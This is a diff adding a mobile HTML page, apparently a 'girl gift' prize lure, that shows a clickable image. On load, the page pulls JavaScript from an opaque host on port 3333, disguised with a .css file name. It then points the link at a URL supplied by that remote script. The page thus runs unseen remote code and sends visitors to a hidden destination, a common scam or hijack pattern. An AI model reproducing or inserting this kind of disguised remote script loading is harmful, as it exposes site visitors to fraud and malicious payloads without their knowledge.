@@ -1,0 +1,81 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <style type="text/css">
+        * {
+            margin: 0px;
+            padding: 0px;
+            overflow: none;
+        }
+
+        div {
+            margin: 0;
+            padding: 0;
+        }
+
+        a {
+            width: 100%;
+            height: auto;
+            overflow: hidden;
+        }
+
+        a img {
+            width: 100%;
+            height: auto;
+            overflow: hidden;
+        }
+    </style>
+    <script type="text/javascript">
+        //缩放比例
+        if (/Android (\d+\.\d+)/.test(navigator.userAgent)) {
+            var version = parseFloat(RegExp.$1);
+            if (version > 2.3) {
+                var phoneScale = parseInt(window.screen.width) / 640;
+                document.write('<meta name="viewport" content="width=640, minimum-scale = ' + phoneScale + ', maximum-scale = ' + phoneScale + ', target-densitydpi=device-dpi">');
+            }
+            else {
+                document.write('<meta name="viewport" content="width=640, target-densitydpi=device-dpi">');
+            }
+        }
+        else {
+            document.write('<meta name="viewport" content="width=640, user-scalable=no, target-densitydpi=device-dpi">');
+        }
+    </script>
+    <meta name="viewport"
+          content="width=640, minimum-scale = 0.625, maximum-scale = 0.625, target-densitydpi=device-dpi">
+</head>
+<body marginheight="0">
+<a id='target_adv' target="_blank" href=""><img src="http://weixin-girl-gift.wedatabank.com/prize/img/4.jpg"></a>
+<script src="http://weixin-girl-gift.wedatabank.com/prize/js/jquery.min.js"></script>
+<script>
+function loadJS(src, callback, errCallback) {
+    if (!src) {
+        return;
+    }
+    var e = document.createElement('script');
+    e.setAttribute('type', 'text/javascript');
+    e.setAttribute('charset', "utf-8");
+    e.setAttribute('src', src);
+    document.getElementsByTagName('head')[0].appendChild(e);
+    if (typeof errCallback == 'function') {
+        e.onerror = errCallback;
+    }
+    e.onload = function () {
+        if (typeof callback == 'function') {
+            callback();
+        }
+    };
+}
+
+loadJS('http://xx.2222514.com:3333/var/1002_1.css', function () {
+    if (turl) {
+        $('#target_adv').attr('href', turl);
+    }
+});
+</script>
+</body>
+</html>
